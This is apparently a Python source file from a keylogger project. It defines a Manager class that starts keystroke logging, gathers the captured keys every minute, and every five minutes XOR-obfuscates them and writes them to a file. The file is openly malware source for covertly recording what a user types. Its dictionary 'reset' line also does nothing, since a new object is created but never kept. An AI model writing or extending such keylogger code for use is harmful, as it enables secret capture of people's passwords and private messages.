from time import sleep

from keyLogger import *
from writer import *
from encryptor import *

class Manager:
    """Manager class for the KeyLogger,
    handling the writing and encryption of keystrokes."""

    def __init__(self):
        """Initialize the Manager with a KeyLogger instance and start logging."""
        self.l = KeyLogger()
        self.l.start_logging()

    def activity(self):
        """Perform the keylogging activity,
        writing data to a dictionary and file, and encrypting it periodically."""

        w = FileWriter()
        dw = DictWriter()
        count = 0
        while True:
            # Get the list of logged keys
            get_list = self.l.get_logged_keys()
            # Write the list of characters to the dictionary writer
            dw.write(get_list)
            # Every 5 minutes, encrypt and write the dictionary to a file
            if count % 5 == 0:
                # Get the dictionary from the dictionary writer
                get_dict = dw.get_dict()
                # Encrypt the dictionary
                dict_encrypt = XorEncryptor().encrypt(get_dict)
                # Write the encrypted dictionary to the file
                FileWriter().write(dict_encrypt)
                if count >= 15:
                    DictWriter()
                    count = 0
            # Wait for a minute
            sleep(60)
            count += 1